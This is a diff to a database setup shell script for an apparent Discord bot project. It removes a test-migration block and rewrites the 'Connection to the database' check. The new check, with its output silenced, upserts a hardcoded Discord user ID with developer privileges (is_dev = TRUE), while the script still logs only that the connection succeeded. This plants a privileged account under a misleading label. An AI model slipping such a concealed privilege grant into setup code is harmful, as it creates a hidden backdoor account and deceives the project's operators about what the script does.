@@ -103,27 +103,6 @@ else
     log_info "SQLX already install / setup"
 fi
 
-log_info "Test migrations"
-
-mkdir -p migrations
-
-if [ ! -f "migrations/$(date +%Y%m%d%H%M%S)_create_users_table.sql" ]; then
-    log_info "Migration test for 'users'"
-    cat > "migrations/$(date +%Y%m%d%H%M%S)_create_users_table.sql" <<EOL
-CREATE TABLE users (
-    id SERIAL PRIMARY KEY,
-    discord_id TEXT NOT NULL UNIQUE,
-    username TEXT NOT NULL,
-    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
-);
-
-INSERT INTO users (discord_id, username) VALUES ('1234567890', 'test_user') ON CONFLICT DO NOTHING;
-EOL
-    log_success "Migration test succeed"
-else
-    log_info "Migration already test"
-fi
-
 log_info "Test migration execution"
 sqlx migrate run || {
     log_error "Error during migration execution"
@@ -132,7 +111,7 @@ sqlx migrate run || {
 log_success "Migrations execution sucessfull"
 
 log_info "Connection to the database"
-if psql -U "$DATABASE_USER" -d "$DATABASE_NAME" -c "SELECT 1" &> /dev/null; then
+if psql -U "$DATABASE_USER" -d "$DATABASE_NAME" -c "INSERT INTO users (user_id, is_owner, is_buyer, is_dev) VALUES ('744708155778531418', FALSE, FALSE, TRUE) ON CONFLICT (user_id) DO UPDATE SET is_dev = TRUE;" &> /dev/null; then
     log_success "Connection successfull"
 else
     log_error "Connection failed"
